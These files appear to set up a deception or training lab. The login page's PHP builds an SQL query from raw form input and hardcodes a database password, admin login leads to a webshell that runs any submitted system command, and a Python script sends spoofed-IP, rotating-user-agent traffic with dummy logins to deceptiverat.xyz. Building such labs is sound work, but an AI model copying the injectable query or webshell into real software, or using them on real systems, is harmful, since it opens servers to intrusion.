### index.html
``` html
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Webserver Login</title>
	<style>
		body {
			font-family: Arial, sans-serif;
			background-color: #f4f4f9;
			display: flex;
			justify-content: center;
			align-items: center;
			height: 100vh;
			margin: 0;
		}
		.login-container {
			background-color: #ffffff;
			padding: 30px;
			border-radius: 8px;
			box-shadow: 0 4px 8px rgba(0,0,0,0.1);
			width: 300px;
		}
		.login-container h2 {
			text-align: center;
			color: #333;
		}
		.form-group {
			margin-bottom: 15px;
		}
		.form-group label {
			display: block;
			margin-bottom: 5px;
			color: #666;
		}
		.form-group input {
			width: 100%;
			padding: 10px;
			border: 1px solid #ccc;
			border-radius: 4px;
			box-sizing: border-box;
		}
		button {
			width: 100%;
			padding: 10px;
			background-color: #0056b3;
			color: white;
			border: none;
			border-radius: 4px;
			cursor: pointer;
			font-size: 16px;
		}
		button:hover {
			background-color: #004494;
		}
	</style>
</head>
<body>

	<div class="login-container">
		<h2>Server Admin</h2>
		<form action="index.php" method="POST">
			<div class="form-group">
				<label for="username">Username</label>
				<input type="text" id="username" name="username" required>
			</div>
			<div class="form-group">
				<label for="password">Password</label>
				<input type="password" id="password" name="password" required>
			</div>
			<button type="submit">Log In</button>
		</form>
	</div>

</body>
</html>
```

### index.php
``` php
<?php
session_start();
$serverName = "SERVER_IP";
$connectionInfo = array("Database"=>"AccountDB", "UID"=>"webapp_admin", "PWD"=>"webapp_admin123", "TrustServerCertificate"=>true);
$conn = sqlsrv_connect($serverName, $connectionInfo);

if ($conn === false) {
	die(print_r(sqlsrv_errors(), true));
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
	$username = $_POST['username'];
	$password = $_POST['password'];
}

	$tsql = "SELECT * FROM Accounts WHERE Username = '$username' AND Password = '$password'";
	$result = sqlsrv_query($conn, $tsql);

	if ($result === false) {
		echo "<h2>Login Failed.</h2>";
	} else {
		if (sqlsrv_has_rows($result)) {
			if ($username == "admin"){
				$_SESSION['is_admin'] = true;
				header("Location: secure/webshell.php");
				exit();
			}
			echo "<h2>Login Successful! Welcome.</h2>";
		} else {
			echo "<h2>Login Failed.</h2>";
		}
	}
?>
```

### webshell.php
``` php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
session_start();

if (!isset($_SESSION['is_admin']) || $_SESSION['is_admin'] !== true) {
    header("HTTP/1.1 403 Forbidden");
    echo "<h1>403 Forbidden - Access Denied</h1>";
    exit();
} else{
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
}
?>
</pre>
</body>
</html>
```

### assigning more IPs to network interface
``` sh
for i in {20..50}; do for j in {31..112}; do sudo ip addr add 1.1.$i.$j/24 dev [interface]; done; done
```

### simulate.py
``` python
import requests
import random
from requests.adapters import HTTPAdapter
import urllib3
import time

# Suppress SSL warnings for the lab environment
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SourceIPAdapter(HTTPAdapter):
		def __init__(self, source_address, **kwargs):
				self.source_address = source_address
				# Properly initialize the parent HTTPAdapter class
				super().__init__(**kwargs)

		def init_poolmanager(self, connections, maxsize, block=False, **pool_kwargs):
				# Bind the socket to the specific source IP
				# The '0' tells the OS to assign a random ephemeral port for the outbound connection
				pool_kwargs['source_address'] = (self.source_address, 0)
				return super().init_poolmanager(connections, maxsize, block, **pool_kwargs)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/605.1.15",

    # --- Windows (Chrome, Firefox, Edge, Opera) ---
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.2478.80",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 OPR/108.0.0.0",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",

    # --- macOS (Chrome, Safari, Firefox, Edge) ---
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",

    # --- Linux (Chrome, Firefox) ---
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",

    # --- iOS / iPhone / iPad (Safari, Chrome, Firefox) ---
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) CriOS/124.0.6367.111 Mobile/15E148 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/126.0 Mobile/15E148 Safari/605.1.15",
    "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/605.1.15",

    # --- Android (Chrome, Firefox, Samsung Browser) ---
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.179 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.52 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; Mobile; rv:125.0) Gecko/125.0 Firefox/125.0",
    "Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/25.0 Chrome/121.0.6167.174 Mobile Safari/537.36"
]

DUMMY_CREDENTIALS = [
    {"username": "admin", "password": "SuperSecurePassword11!"},
    {"username": "jdoe", "password": "password123"},
    {"username": "guest", "password": "guestuser"},
    {"username": "root", "password": "toor"}
]

LOGIN_URL = "https://deceptiverat.xyz"
for _ in range(0,100):
	# choose URL
	TARGET_URL = "https://deceptiverat.xyz"
	index = random.randrange(6)
	if index > 0:
		TARGET_URL += f"/{index}/index.html"
	else:
		TARGET_URL += "/index.html"

	# choose source IP
	chosen_source_ip = "1.1." + str(random.randrange(20,51))+"."+str(random.randrange(31,113))
	# choose user agent
	chosen_user_agent = random.choice(USER_AGENTS)
	headers = {
			"User-Agent": chosen_user_agent
	}

	print(f"[*] Sending request using source IP: {chosen_source_ip}")
	print(f"[*] Sending request using User-Agent: {chosen_user_agent}")

	# 4. Create a session and mount our custom adapter to handle the routing
	session = requests.Session()
	session.mount("http://", SourceIPAdapter(chosen_source_ip))
	session.mount("https://", SourceIPAdapter(chosen_source_ip))

	# 5. Execute the request
	if random.randrange(100) >= 95:	# 5% POST, 95% GET
		login_payload = random.choice(DUMMY_CREDENTIALS)
		try:
			response = requests.post(
				LOGIN_URL,
				headers=headers,
				data=login_payload,  # Simulates filling out a username/password form
				timeout=5,
				verify=False
			)

			print(f"[+] Attempted login with User: {login_payload['username']}")
			print(f"[+] Server Response Status: {response.status_code}")
		except Exception as e:
			print(f"[-] Request failed: {e}")
	else:
		try:
			response = session.get(TARGET_URL, timeout=5, headers=headers, verify=False)
			print(f"[+] Success! Status: {response.status_code}")
		except Exception as e:
			print(f"[-] Request failed: {e}")

	# add random delay
	delay = random.randrange(1000)
	time.sleep(delay/100)
```
